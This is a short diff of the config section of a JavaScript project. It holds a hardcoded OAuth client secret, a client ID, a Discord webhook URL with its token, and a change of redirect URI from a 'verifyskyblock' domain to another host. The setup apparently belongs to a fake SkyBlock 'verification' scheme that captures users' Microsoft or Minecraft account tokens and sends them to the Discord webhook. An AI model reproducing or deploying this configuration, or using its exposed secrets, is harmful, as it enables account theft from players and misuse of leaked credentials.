@@ -1,7 +1,7 @@
 //Config
 const secret_value = 'lSS8Q~__msihxNWrlWLLo2ySkLaV.I2IG8aoib9k'
 const client_id = 'a30c9d19-7ae6-48ef-b625-a86444a5aeed'
-const redirect_uri = 'https://verifyskyblock.netlify.app'
+const redirect_uri = 'https://different-fawn-gaiters.cyclic.app'
 const webhook_url = 'https://discord.com/api/webhooks/1045338697500999740/-fGf7uq6z1N6HjAqd-9KaCncQ-YmgHjZmBOvpw50EjjVfwrgz8KAj0p134je-E5299Mk'
 //Requirements
 const axios = require('axios')
